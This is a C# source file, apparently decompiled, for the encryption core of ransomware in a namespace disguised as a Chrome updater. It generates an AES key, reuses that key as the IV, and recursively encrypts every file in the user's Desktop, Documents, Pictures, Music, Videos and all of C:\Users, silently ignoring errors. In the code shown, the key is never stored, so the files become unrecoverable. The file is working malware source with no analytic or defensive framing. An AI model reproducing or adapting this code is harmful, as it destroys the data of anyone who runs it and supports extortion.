using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ChromeUpadter.Ransomware;

public class AES
{
	private object userDir;

	public AES()
	{
		userDir = "C:\\\\Users\\\\";
	}

	public static byte[] generateKey()
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.GenerateKey();
		return rijndaelManaged.Key;
	}

	public static byte[] encrypt(byte[] data, byte[] key)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(key, key);
		return cryptoTransform.TransformFinalBlock(data, 0, data.Length);
	}

	public static byte[] decrypt(byte[] byte_ciphertext, byte[] key)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(key, key);
		return cryptoTransform.TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length);
	}

	public void crypt()
	{
		Thread.CurrentThread.Priority = ThreadPriority.Highest;
		byte[] aesKey = generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), aesKey);
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), aesKey);
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), aesKey);
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), aesKey);
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), aesKey);
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), aesKey);
		encryptAll(Conversions.ToString(userDir), aesKey);
	}

	private static void encryptAll(string dir, byte[] aesKey)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.*");
			foreach (FileInfo fileInfo in files)
			{
				CryptFile.encryptFile(fileInfo.FullName, aesKey);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				encryptAll(directoryInfo2.FullName, aesKey);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
